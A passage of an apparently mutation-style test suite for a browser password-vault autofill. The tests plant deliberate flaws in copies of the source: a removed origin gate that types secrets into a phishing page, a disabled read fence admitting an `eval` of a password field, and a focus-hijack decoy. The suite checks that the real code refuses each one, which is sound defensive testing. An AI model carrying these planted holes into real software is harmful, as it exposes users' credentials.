      const forgetSrc = anchored(bdD, '      if (parentKey(browserKey) === String(browserKey) && !holdsAnyLease(browserKey)) tabMoves.byConv.delete(String(browserKey));\n', '      if (parentKey(browserKey) === String(browserKey)) tabMoves.byConv.delete(String(browserKey));\n', 'B-21cc control: the prune forgets a live mover'); // stale-pins: kept — r2992's prune, planted back as this RED control
      const plR = await pruneLive(MD.load('src/server/browser-dialogs.js', forgetSrc, 'prune-forgets-mover'));
      ok(plR.landed, 'RED CONTROL (r3159 (1a), r2992\'s prune): the other lease\'s end deletes the conversation\'s whole entry — the note sees no mover since the /resolve and the snapshot is adopted on the MOVED tab: the leg above can go red', plR);
    }
    {
      const keepMoves = anchored(bdD, '      if (parentKey(browserKey) === String(browserKey) && !holdsAnyLease(browserKey)) tabMoves.byConv.delete(String(browserKey));\n', '', 'B-21cc control: the moves never pruned');
      const prR = await pruneScene(MD.load('src/server/browser-dialogs.js', keepMoves, 'moves-unpruned'));
      ok(prR.afterEnd.conversations.includes(T.browserKey), 'RED CONTROL (r2992 (4)): the conversation\'s entry never pruned — it outlives its lease: the leg above can go red', prR);
    }
    // (5) ONE CLOCK: a mover is stamped on the keeper's clock, the one the route stamps the verb's /resolve instant with — a hub whose
    // dialogs clock lags the keeper's still knows a mover after /resolve; and the remembered tab is judged by NUMBER (no same-ms tie)
    const clockScene = async (Dmod) => {
      const AHEAD = 60000;
      const w = await worldD(Dmod, { clock: () => Date.now() + AHEAD });
      cur = { ok: true, targetId: tidS }; resetD();
      const since = Date.now() + AHEAD; // the verb's /resolve instant, on the keeper's clock
      await sleepD(3); w.moveTab('tab-verb', { browserKey: T.browserKey }); // a mover AFTER it
      const n = await w.noteSnapshot(T, { parsedRefs: REF('@e5'), since });
      const r = await fillRef(w, '@e5');
      const res = { n, r: r && { ok: r.ok, code: r.code, error: r.error }, landed: valOf(tidS) === PW_D, nothing: valOf(tidS) === '' && valOf(tidO) === '' };
      resetD(); w.shutdown();
      return res;
    };
    const cs = await clockScene(Dm);
    ok(!!(cs.n && cs.n.code === 'tab_moved' && refusedMoved(cs.r) && cs.nothing), 'B-21cc (r2992 (5)): ONE CLOCK — a mover after the verb\'s /resolve instant is known as such though the dialogs\' own clock lags the keeper\'s by a minute: the slot is unknown, the fill refuses by name', cs);
    {
      const twoClocks = anchored(bdD, '    const rec = { seq: ++tabMoveSeq, at: clockNow(), why };', '    const rec = { seq: ++tabMoveSeq, at: now(), why };', 'B-21cc control: the mover on the dialogs\' own clock'); // stale-pins: kept — the older line, planted back as this RED control
      const csR = await clockScene(MD.load('src/server/browser-dialogs.js', twoClocks, 'two-clocks'));
      ok(csR.landed, 'RED CONTROL (r2992 (5)): two clocks — the mover stamped on a clock a minute behind the /resolve instant reads as BEFORE it, and the old snapshot is adopted: the leg above can go red', csR);
    }
    {
      // the same-millisecond tie: an ack, then a mover in the SAME millisecond (tried until both land in one) — by number the mover outranks
      const tie = async (Dmod) => {
        const w = await worldD(Dmod);
        let reached = false, got = null;   // r3159 (2): the run says the tie was reached, and the legs require it
        for (let i = 0; i < 40 && !reached; i++) {
          await sleepD(2);
          const t0 = Date.now(); w.noteActiveTab(T, tidO); w.moveTab('person-tab-act', { profileId: T.profileId }); const t1 = Date.now();
          if (t0 === t1) { reached = true; got = w.rememberedTabOf(T); }
        }
        w.shutdown();
        return { reached, got };
      };
      const tieNow = await tie(Dm);
      const tieAt = anchored(bdD, '    return m && m.tid && Number.isInteger(m.moveSeq) && tabEpochOf(pid, target && target.browserKey).seq <= m.moveSeq && tabs.some((x) => x.targetId === m.tid) ? m.tid : null;', '    return m && m.tid && m.at >= tabEpochOf(pid, target && target.browserKey).at && tabs.some((x) => x.targetId === m.tid) ? m.tid : null;', 'B-21cc control: the remembered tab by instants'); // stale-pins: kept — the older line, planted back as this RED control
      const tieOld = await tie(MD.load('src/server/browser-dialogs.js', tieAt, 'remembered-by-instant'));
      ok(tieNow.reached && tieNow.got === null && tieOld.reached && tieOld.got === tidO, 'B-21cc (r2992 (5)): the remembered tab is judged by NUMBER — an ack and a mover in the SAME millisecond: the mover outranks the ack (none named); RED: judged by instants, the tie trusts the ack', { tieNow, tieOld });
    }

    // (5) THE FRAME NOTE's TAB, WITHOUT A READ: the only tab, or the last ack no mover followed — else none (silent rather than wrong)
    const w5d = await worldD(Dm);
    await sleepD(3); w5d.moveTab('person-tab-act', { profileId: T.profileId }); // the world's own named notes left an ack: a mover after it
    const f0 = w5d.rememberedTabOf(T);
    await sleepD(3); w5d.noteActiveTab(T, tidO); const f1 = w5d.rememberedTabOf(T);
    await sleepD(3); w5d.moveTab('person-tab-act', { profileId: T.profileId }); const f2 = w5d.rememberedTabOf(T);
    await sleepD(3); w5d.noteActiveTab(T, tidS); const f3 = w5d.rememberedTabOf(T);
    {
      const staleSrc = anchored(bdD, '    return m && m.tid && Number.isInteger(m.moveSeq) && tabEpochOf(pid, target && target.browserKey).seq <= m.moveSeq && tabs.some((x) => x.targetId === m.tid) ? m.tid : null;', '    return m && m.tid && tabs.some((x) => x.targetId === m.tid) ? m.tid : null;', 'B-21cc control: the frame note\'s tab after a mover');
      const w = await worldD(MD.load('src/server/browser-dialogs.js', staleSrc, 'frame-stale'));
      await sleepD(3); w.noteActiveTab(T, tidO); await sleepD(3); w.moveTab('person-tab-act', { profileId: T.profileId });
      const stale = w.rememberedTabOf(T);
      w.shutdown();
      ok(stale === tidO, 'RED CONTROL (r2849 (5)): the ack trusted after a mover names a tab the driver may have left — the frame note\'s leg below can go red', { stale });
    }
    fkD.closeTarget(tidO); await sleepD(80);
    const f4 = w5d.rememberedTabOf(T);
    w5d.shutdown();
    ok(f0 === null && f1 === tidO && f2 === null && f3 === tidS && f4 === tidS, 'B-21cc (r2849 (5)): the snapshot\'s frame note is asked of a tab the watch knows WITHOUT a read — the last tab ack while no mover followed it, or the conversation\'s only tab; two tabs and no such ack, or a mover after it ⇒ none: silent rather than wrong', { f0, f1, f2, f3, f4 });
    for (const r of copiesCensus(MD.files, MD.dir, REPO, { label: 'B-21cc r2849 controls: ' })) ok(r.pass, r.name, r.detail);
  } finally {
    for (const w of wsD) { try { w.shutdown(); } catch { } }
    LF?.clearAllFilledSecrets?.();
    engD.close();
    await fkD.close();
    fs.rmSync(ROOT4D, { recursive: true, force: true });
  }
}

// ═══ ⑤ EIGHTEEN NAMED RED MUTANTS (ORIGIN · FENCE · MASK+WIPE · L1..L5 · M1 · N1×2 · N2 · N4 · m2 · N5 · m3 · m6 · m7) ═══
console.log('⑤ 18 named RED mutants: origin-gate · read-fence · mask-wipe · L1..L5 · M1 · N1(hold+toPerson) · N2(AX) · N4(cap) · m2(net) · N5(guard) · m3(verb) · m6(totp) · m7(ambig)');
if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js exports fillVaultElement')) {
  const MUT = mutantCopies('vl-r23-mutants', REPO);
  const blSrc = fs.readFileSync(path.join(REPO, 'src/browser-login.js'), 'utf8');
  const lfSrc = fs.readFileSync(path.join(REPO, 'src/server/browser-login-fill.js'), 'utf8');
  const bdSrc = fs.readFileSync(path.join(REPO, 'src/server/browser-dialogs.js'), 'utf8');
  const csSrc = fs.readFileSync(path.join(REPO, 'src/cdp-frame-scrub.js'), 'utf8');   // the credential scan (moved from browser-dialogs.js: the twin's worker, 主开发 r2445 — a browser-dialogs copy delegates to the REAL module)
  const veSrc = fs.readFileSync(path.join(REPO, 'src/server/vault-engine.js'), 'utf8');

  // Mutant 1: remove origin gate in fillVaultElement -> types secret on evil origin!
  const m1LfSrc = editAnchor(lfSrc, '  if (iso.origin !== wantOrigin) {', '  if (false && iso.origin !== wantOrigin) {', "src/server/browser-login-fill.js");
  const LF_M1 = m1LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m1LfSrc, 'origin-gate-removed') : null;
  const fkM1 = await startFakeKernel({ firstUrl: 'https://evil.example.test/phish' });
  try {
    const tidM1 = fkM1.targets()[0].targetId;
    fkM1.setDom(tidM1, { url: 'https://evil.example.test/phish', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
    const WebSocket = require(path.join(REPO, 'node_modules/ws'));
    const wsM1 = new WebSocket(fkM1.wsUrl);
    await new Promise((r) => wsM1.once('open', r));
    let idSeq = 0, sidM1 = null;
    const pending = new Map();
    wsM1.on('message', (raw) => {
      const m = JSON.parse(String(raw));
      if (m.method === 'Target.attachedToTarget') sidM1 = m.params.sessionId;
      if (m.id && pending.has(m.id)) { const fn = pending.get(m.id); pending.delete(m.id); fn(m); }
    });
    const sendCdp = (method, params = {}, sessionId = undefined) => new Promise((resolve) => {
      const id = ++idSeq;
      pending.set(id, resolve);
      wsM1.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
    });
    await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
    await untilFact(() => sidM1, 'MUTANT 1: the page\'s auto-attached session');   // the flake census r2: was 30 × 5 ms

    const realPhish = await LF.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM1), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM1, trackedUrl: 'https://evil.example.test/phish',
      origin: 'https://shop.example.test', target: '#pw', slot: 'current', value: 'Secret#OriginGate1', secret: true,
    });
    const mutPhish = LF_M1 ? await LF_M1.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM1), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM1, trackedUrl: 'https://evil.example.test/phish',
      origin: 'https://shop.example.test', target: '#pw', slot: 'current', value: 'Secret#OriginGate1', secret: true,
    }) : null;
    ok(!realPhish.ok && realPhish.code === 'login_phishing' && Boolean(mutPhish && mutPhish.ok) && fkM1.readDomValues(tidM1).pw === 'Secret#OriginGate1',
      'MUTANT 1 RED (origin-gate-removed): real fillVaultElement refuses https://evil.example.test [login_phishing]; mutant types secret into evil origin');
    wsM1.close();
  } finally {
    LF.clearAllFilledSecrets?.();
    LF_M1?.clearAllFilledSecrets?.();
    await fkM1.close();
  }

  // Mutant 2: remove read fence (`liveFillVerdict` -> `{ ok: true }`) -> lets `eval` read live DOM!
  const m2BlSrc = editAnchor(blSrc,
    "function liveFillVerdict({ verb = '', argv = [], batchVerbs = null, origin = '', holdReason = '' } = {}) {",
    "function liveFillVerdict() { return { ok: true }; }\nfunction _deadLiveFillVerdict({ verb = '', argv = [], batchVerbs = null, origin = '', holdReason = '' } = {}) {"
  , "src/browser-login.js");
  const BL_M2 = m2BlSrc !== blSrc ? MUT.load('src/browser-login.js', m2BlSrc, 'read-fence-removed') : null;
  const realFence = BL.liveFillVerdict({ verb: 'eval', argv: ['eval', 'document.querySelector("#pw").value'], origin: 'https://shop.example.test' });
  const mutFence = BL_M2 ? BL_M2.liveFillVerdict({ verb: 'eval', argv: ['eval', 'document.querySelector("#pw").value'], origin: 'https://shop.example.test' }) : null;
  ok(!realFence.ok && realFence.code === 'login_fill_live' && Boolean(mutFence && mutFence.ok === true),
    'MUTANT 2 RED (read-fence-removed): real liveFillVerdict blocks `eval` [login_fill_live]; mutant admits `eval` while secret is live');

  // Mutant 3: remove `<input type="password">` mask check & post-submit wipe -> types password into `<input type="text">` and leaves plaintext after submit!
  const m3LfSrc = editAnchor(editAnchor(lfSrc,
    "const wantSecretPw = Boolean(secret && slot !== 'otp');", 'const wantSecretPw = false;', "src/server/browser-login-fill.js", 'all'),
    'async function wipeTabTypedInputs(', 'async function wipeTabTypedInputs() { return { ok: true, wiped: 0 }; }\nasync function _deadWipeTabTypedInputs(', "src/server/browser-login-fill.js");
  const LF_M3 = m3LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m3LfSrc, 'mask-wipe-removed') : null;
  const fkM3 = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
  try {
    const tidM3 = fkM3.targets()[0].targetId;
    fkM3.setDom(tidM3, { url: 'https://shop.example.test/login', elements: [{ id: 'txt', tag: 'input', type: 'text', name: 'Plain' }] });
    const WebSocket = require(path.join(REPO, 'node_modules/ws'));
    const wsM3 = new WebSocket(fkM3.wsUrl);
    await new Promise((r) => wsM3.once('open', r));
    let idSeq = 0, sidM3 = null;
    const pending = new Map();
    wsM3.on('message', (raw) => {
      const m = JSON.parse(String(raw));
      if (m.method === 'Target.attachedToTarget') sidM3 = m.params.sessionId;
      if (m.id && pending.has(m.id)) { const fn = pending.get(m.id); pending.delete(m.id); fn(m); }
    });
    const sendCdp = (method, params = {}, sessionId = undefined) => new Promise((resolve) => {
      const id = ++idSeq;
      pending.set(id, resolve);
      wsM3.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
    });
    await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
    await untilFact(() => sidM3, 'MUTANT 3: the page\'s auto-attached session');   // the flake census r2: was 30 × 5 ms

    const realUnmasked = await LF.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM3, trackedUrl: 'https://shop.example.test/login', profileId: 'bp-m3',
      origin: 'https://shop.example.test', target: '#txt', slot: 'current', value: 'Secret#MaskWipe3', secret: true,
    });
    const mutUnmasked = LF_M3 ? await LF_M3.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM3, trackedUrl: 'https://shop.example.test/login', profileId: 'bp-m3',
      origin: 'https://shop.example.test', target: '#txt', slot: 'current', value: 'Secret#MaskWipe3', secret: true,
    }) : null;
    if (LF_M3) await LF_M3.wipeTabTypedInputs({ call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p), targetId: tidM3, profileId: 'bp-m3' });
    const afterMutWipe = fkM3.readDomValues(tidM3).txt;
    await LF.wipeTabTypedInputs({ call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p), targetId: tidM3, profileId: 'bp-m3' });
    ok(!realUnmasked.ok && realUnmasked.code === 'login_bad_field' && Boolean(mutUnmasked && mutUnmasked.ok) && afterMutWipe === 'Secret#MaskWipe3',
      'MUTANT 3 RED (mask-wipe-removed): real fillVaultElement refuses <input type="text"> [login_bad_field] and wipes after submit; mutant types into text input and leaves plaintext');
    wsM3.close();
  } finally {
    LF.clearAllFilledSecrets?.();
    LF_M3?.clearAllFilledSecrets?.();
    await fkM3.close();
  }

  // Mutant 4 (L1): remove `multipart/` branch & fail-closed default -> cross-origin FormData body leaks secret unblocked!
  const m4BdSrc = editAnchor(editAnchor(csSrc,
    "if (media.startsWith('multipart/') || (!media && /^--[^\\r\\n]{1,128}\\r?\\ncontent-disposition:/i.test(bodyText))) {", 'if (false) {', "src/cdp-frame-scrub.js"),
    "return { carries: false, undecodable: true, reason: `unsupported_content_type:${media || 'unknown'}` };", "return { carries: false, undecodable: false, reason: 'none' };", "src/cdp-frame-scrub.js");
  const BD_M4 = m4BdSrc !== csSrc ? MUT.load('src/cdp-frame-scrub.js', m4BdSrc, 'multipart-branch-removed') : null;
  {
    const m4Secret = 'Mut4Secret!' + crypto.randomBytes(4).toString('hex');
    const m4Sigs = Dm.credSigOf ? [Dm.credSigOf(m4Secret)] : [];
    const bnd = '----WebKitFormBoundaryMut4';
    const ct = `multipart/form-data; boundary=${bnd}`;
    const mp = `--${bnd}\r\nContent-Disposition: form-data; name="pw"\r\n\r\n${m4Secret}\r\n--${bnd}--\r\n`;
    const realDetects = Dm.bodyCarriesCredential ? Dm.bodyCarriesCredential(mp, m4Sigs, ct) : false;
    const mutDetects = BD_M4?.bodyCarriesCredential ? BD_M4.bodyCarriesCredential(mp, m4Sigs, ct) : true;
    ok(realDetects === true && mutDetects === false,
      'MUTANT 4 RED (L1 multipart-branch-removed): real bodyCarriesCredential detects secret in multipart/form-data; mutant misses it and lets cross-origin FormData pass');
  }

  // Mutant 5 (L2): remove `rev` from `vault-engine.js:secretNames()` -> Vault-window `{ name, rev: entry.rev }` fails with `card_changed` on `rev >= 2`!
  const m5VeSrc = editAnchor(veSrc, ', ...(Number.isInteger(b.rev) && b.rev >= 1 ? { rev: b.rev } : {})', '', "src/server/vault-engine.js");
  const VE_M5 = m5VeSrc !== veSrc ? MUT.load('src/server/vault-engine.js', m5VeSrc, 'secretNames-without-rev') : null;
  {
    const dirM5 = scratch('vl-r23-m5');
    fs.rmSync(dirM5, { recursive: true, force: true });
    fs.mkdirSync(dirM5, { recursive: true });
    try {
      const g5 = GS.create({ memory: true });
      const engM5 = VE_M5 ? VE_M5.create({ dataDir: dirM5, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false }) : null;
      if (engM5) {
        await engM5.setup('Mut5Vault#Pass');
        const logM5 = Lm.create({ vault: engM5, grants: () => g5, log: () => {} });
        logM5.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'InitPw!1234567890' }, { who: 'owner' });
        logM5.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-m5');
        const rfM5 = logM5.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#alice/password', generate: true, facts: { conversationKeys: ['conv-m5'] } });
        const rowM5 = logM5.list().entries.find((e) => e.user === 'alice');
        const mutConf = logM5.confirmOwn(rowM5.name, { rev: rowM5.rev, who: 'owner' });
        const mutDisc = logM5.discardPending(rowM5.name, { rev: rowM5.rev, who: 'owner' });
        ok(rowM5.rev === 1 && !mutConf.ok && mutConf.code === 'card_changed' && !mutDisc.ok && mutDisc.code === 'card_changed',
          'MUTANT 5 RED (L2 secretNames-without-rev): without rev in secretNames(), list() reports rev=1 and Vault-window confirm/discard fail with card_changed',
          { rfM5, rev: rowM5?.rev, mutConf, mutDisc });
        engM5.close();
      } else {
        ok(false, 'MUTANT 5 RED (L2 secretNames-without-rev): anchor not found in vault-engine.js');
      }
    } finally {
      fs.rmSync(dirM5, { recursive: true, force: true });
    }
  }

  // Mutant 6 (L3): pass `{ usernameHint: p.usernameHint }` instead of `{ username: uname }` -> takeover credentialSubmitted files 0 cards!
  const m6BdSrc = editAnchor(bdSrc,
    'const r = logins.offerOwnerSaveCard({ origin: pageOrigin, username: uname, password: rawPw, profileId: w.profileId });',
    'const r = logins.offerOwnerSaveCard({ origin: pageOrigin, usernameHint: uname, password: rawPw, profileId: w.profileId });'
  , "src/server/browser-dialogs.js");
  const BD_M6 = m6BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m6BdSrc, 'usernameHint-field-mismatch') : null;
  // Mutant 7 (L4): restore cross-tab `preferRef` fallback in `pickScopedTabFor` -> `@e2` on tab B types into background tab A!
  const m7BdSrc = editAnchor(editAnchor(editAnchor(bdSrc,
    'function pickScopedTabFor(w, target, { targetId = null } = {}) {', 'function pickScopedTabFor(w, target, { targetId = null, preferRef = null } = {}) {', "src/server/browser-dialogs.js"),
    
      '      return e && inScope(scope, e.targetId) && e.sid ? e : null;',
      '      if (preferRef && !(e && e.snapshotRefs?.specs?.has(preferRef))) { const withRef = [...w.targets.values()].find((x) => x.sid && x.snapshotRefs?.specs?.has(preferRef)); if (withRef) return withRef; }\n      return e && inScope(scope, e.targetId) && e.sid ? e : null;'
    , "src/server/browser-dialogs.js"),
    // B-21cc (r2491): the fill names ONE tab (the conversation's current one), so the cross-tab fallback is planted where it now looks
      '    if (!ct.ok) return ct;\n    const e = pickScopedTabFor(w, target, { targetId: ct.targetId });',
      '    if (!ct.ok) return ct;\n    const e = pickScopedTabFor(w, target, { targetId: ct.targetId, preferRef: isRef ? tgtStr : null });'
    , "src/server/browser-dialogs.js");
  const BD_M7 = m7BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m7BdSrc, 'cross-tab-ref-fallback') : null;
  // Mutant 9 (M1): skip `precheckVaultFill` -> locked vault sends CDP calls and returns `login_phishing` on wrong-origin tab!
  const m9BdSrc = editAnchor(bdSrc, 'if (!prechecked) {', 'if (false && !prechecked) {', "src/server/browser-dialogs.js");
  const BD_M9 = m9BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m9BdSrc, 'phishing-before-vault-locked') : null;

  {
    const dirM679 = scratch('vl-r23-m679');
    fs.rmSync(dirM679, { recursive: true, force: true });
    fs.mkdirSync(dirM679, { recursive: true });
    const fkM = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
    const engM = VE.create({ dataDir: dirM679, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
    await engM.setup('Mut679#Vault');
    try {
      const gM = GS.create({ memory: true });
      const cardsM6 = [];
      const logM = Lm.create({
        vault: engM, grants: () => gM, log: () => {},
        forYou: { add: (_pid, it) => { if (it.action?.type === 'save-login') cardsM6.push(it); return 'ut-m6'; }, resolve() {} },
      });
      logM.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'AliceMut!12345678' }, { who: 'owner' });
      logM.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-m7');
      const sk = {
        cdpEndpointFor: async () => ({ ok: true, url: fkM.wsUrl }),
        onLease: () => () => {},
        saveLoginFenceState() {},
        loginFenceStateOf: () => null,
        loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkM.wsUrl), action }),
      };
      // Run M6 (L3)
      const w6 = BD_M6 ? BD_M6.create({ keeper: sk, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m', sessionId: 's-m' }], leaseCountOf: () => 1, logins: logM, takeoverOf: () => true }) : null;
      if (w6) {
        await w6.arm('bp-m6');
        fkM.submitCredentialForm({ targetId: fkM.targets()[0].targetId, origin: 'https://shop.example.test', usernameHint: 'human_m6', password: 'HumanM6!Password1' });
        await new Promise((r) => setTimeout(r, 30));
        ok(cardsM6.length === 0, 'MUTANT 6 RED (L3 usernameHint-field-mismatch): passing usernameHint instead of username files 0 save-login cards');
        w6.shutdown();
      } else ok(false, 'MUTANT 6 RED (L3): anchor not found');

      // Run M7 (L4)
      const tidA = fkM.targets()[0].targetId;
      const tidB2 = fkM.addTarget('https://shop.example.test/b');
      fkM.setDom(tidA, { url: 'https://shop.example.test/login', elements: [{ id: 'u', tag: 'input', type: 'email', name: 'Email' }, { id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      fkM.setDom(tidB2, { url: 'https://shop.example.test/b', elements: [{ id: 'q', tag: 'input', type: 'text', name: 'Search' }] });
      const w7 = BD_M7 ? withCurrentTab(BD_M7).create({ keeper: sk, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m', sessionId: 's-m' }], leaseCountOf: () => 1, logins: logM }) : null;
      if (w7) {
        await w7.arm('bp-m7');
        // B-21cc (r2849): a note that names no tab only KEEPS the snapshot for the fill to adopt, so the two tabs' references are
        // written by NAMED notes — B's first, A's last: the conversation's newest snapshot is A's, so only a fill that LEAVES the
        // tab it acts on (B) for the tab holding the reference (A) types there (the product refuses B's fill by name: a moved tab)
        const parseM7 = require(path.join(REPO, 'src/browser-verbs.js')).parseSnapshotRefs;
        await untilFact(async () => { const nsB = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, { parsedRefs: parseM7('- textbox "Search" [ref=e1]'), targetId: tidB2 }); return !!(nsB && nsB.ok && nsB.count === 1); }, 'MUTANT 7: tab B\'s snapshot noted');   // the flake census r2: was 20 × 10 ms
        await untilFact(async () => { const nsA = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, { parsedRefs: parseM7('- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]'), targetId: tidA }); return !!(nsA && nsA.ok && nsA.count === 2); }, 'MUTANT 7: tab A\'s snapshot noted');
        const r7 = await w7.fillVaultField({ profileId: 'bp-m7', browserKey: 'bk-m' }, { targetId: tidB2, target: '@e2', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-m7'] } });
        ok(Boolean(r7 && r7.ok) && fkM.readDomValues(tidA).pw === 'AliceMut!12345678',
          'MUTANT 7 RED (L4 cross-tab-ref-fallback): falling back to background tab snapshotRefs types secret into background tab A',
          { r7, domA: fkM.readDomValues(tidA) });
        w7.shutdown();
      } else ok(false, 'MUTANT 7 RED (L4): anchor not found');

      // Run M9 (M1)
      fkM.setDom(tidA, { url: 'https://evil.example.test/phish', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const w9 = BD_M9 ? BD_M9.create({ keeper: sk, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m', sessionId: 's-m' }], leaseCountOf: () => 1, logins: logM }) : null;
      if (w9) {
        await w9.arm('bp-m9');
        w9.noteActiveTab({ profileId: 'bp-m9', browserKey: 'bk-m' }, tidA);
        engM.lock();
        const m0 = fkM.mark();
        const r9 = await w9.fillVaultField({ profileId: 'bp-m9', browserKey: 'bk-m' }, { targetId: tidA, target: '#pw', spec: 'shop.example.test#alice/password', facts: {} });
        const c9 = fkM.calls().filter((c) => c.seq > m0);
        ok(c9.length >= 3, 'MUTANT 9 RED (M1 phishing-before-vault-locked): without precheckVaultFill, locked vault sends CDP calls to browser before refusing', { code: r9?.code, cdp: c9.length });
        w9.shutdown();
      } else ok(false, 'MUTANT 9 RED (M1): anchor not found');
    } finally {
      LF.clearAllFilledSecrets?.();
      engM.close();
      await fkM.close();
      fs.rmSync(dirM679, { recursive: true, force: true });
    }
  }

  // Mutant 8 (L5): re-introduce async gap between focus-check and `Input.insertText` -> `setTimeout(0)` decoy receives plaintext secret!
  const m8LfSrc = editAnchor(editAnchor(editAnchor(editAnchor(editAnchor(lfSrc,
    "if (typeof setTimeout === 'function') {", "if (false && typeof setTimeout === 'function') {", "src/server/browser-login-fill.js"),
    'try { node.inert = true; } catch {}', '/* inert disabled */', "src/server/browser-login-fill.js", 'all'),
    "window.addEventListener('focusin', onTypingFocusGuard, true);", '/* focusin guard disabled */', "src/server/browser-login-fill.js"),
    "window.addEventListener('focus', onTypingFocusGuard, true);", '/* focus guard disabled */', "src/server/browser-login-fill.js"),
    "const ins = await send('Input.insertText', { text: val });", "await new Promise((r) => setTimeout(r, 15)); const ins = await send('Input.insertText', { text: val });", "src/server/browser-login-fill.js");
  const LF_M8 = m8LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m8LfSrc, 'async-focus-seam') : null;
  {
    const fkM8 = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
    try {
      const tidM8 = fkM8.targets()[0].targetId;
      fkM8.setDom(tidM8, {
        url: 'https://shop.example.test/login',
        elements: [
          { id: 'decoy_txt', tag: 'input', type: 'text', name: 'Decoy' },
          { id: 'trap_t', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy_txt', focusHijackMode: 'timeout' },
        ],
      });
      const WebSocket = require(path.join(REPO, 'node_modules/ws'));
      const wsM8 = new WebSocket(fkM8.wsUrl);
      await new Promise((r) => wsM8.once('open', r));
      let idSeq = 0, sidM8 = null;
      const pending = new Map();
      wsM8.on('message', (raw) => {
        const m = JSON.parse(String(raw));
        if (m.method === 'Target.attachedToTarget') sidM8 = m.params.sessionId;
        if (m.id && pending.has(m.id)) { const fn = pending.get(m.id); pending.delete(m.id); fn(m); }
      });
      const sendCdp = (method, params = {}, sessionId = undefined) => new Promise((resolve) => {
        const id = ++idSeq;
        pending.set(id, resolve);
        wsM8.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
      });
      await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
      await untilFact(() => sidM8, 'MUTANT 8: the page\'s auto-attached session');   // the flake census r2: was 30 × 5 ms

      const realL5 = await LF.fillVaultElement({
        call: (m, p) => sendCdp(m, p, sidM8), browserCall: (m, p) => sendCdp(m, p),
        targetId: tidM8, trackedUrl: 'https://shop.example.test/login',
        origin: 'https://shop.example.test', target: '#trap_t', slot: 'current', value: 'Secret#AsyncSeam8', secret: true,
      });
      const realEvents = fkM8.readDomInputCounts(tidM8).decoy_txt.inputEvents;
      const mutL5 = LF_M8 ? await LF_M8.fillVaultElement({
        call: (m, p) => sendCdp(m, p, sidM8), browserCall: (m, p) => sendCdp(m, p),
        targetId: tidM8, trackedUrl: 'https://shop.example.test/login',
        origin: 'https://shop.example.test', target: '#trap_t', slot: 'current', value: 'Secret#AsyncSeam8', secret: true,
      }) : null;
      const mutEvents = fkM8.readDomInputCounts(tidM8).decoy_txt.inputEvents;
      ok(!realL5.ok && realL5.code === 'login_form_changed' && realEvents === 0 && mutEvents >= 1,
        'MUTANT 8 RED (L5 async-focus-seam): real fillVaultElement types 0 chars into setTimeout(0) <input type="text"> decoy; mutant leaks secret into decoy across async seam',
        { realL5, mutL5, realEvents, mutEvents });
      wsM8.close();
    } finally {
      LF.clearAllFilledSecrets?.();
      LF_M8?.clearAllFilledSecrets?.();
      await fkM8.close();
    }
  }

  // Mutant 10 (N1a): relax `wantCred` on `holdReason` (r23's bug) -> foreign POST passes unwatched after hold!
  const m10BdSrc = editAnchor(bdSrc,
    'const wantCred = Boolean(e.liveFill || e.credPreArming);',
    'const wantCred = Boolean((e.liveFill && !e.liveFill.holdReason) || e.credPreArming);'
  , "src/server/browser-dialogs.js");
  const BD_M10 = m10BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m10BdSrc, 'n1-hold-relaxes-fetch') : null;

  // Mutant 11 (N1b): `toPerson` sends raw `Fetch.disable` bypassing `syncTabFetchMode` (leaving `e.fetchMode` stale) -> mode flip drops `*` intercept!
  const m11BdSrc = editAnchor(editAnchor(bdSrc,
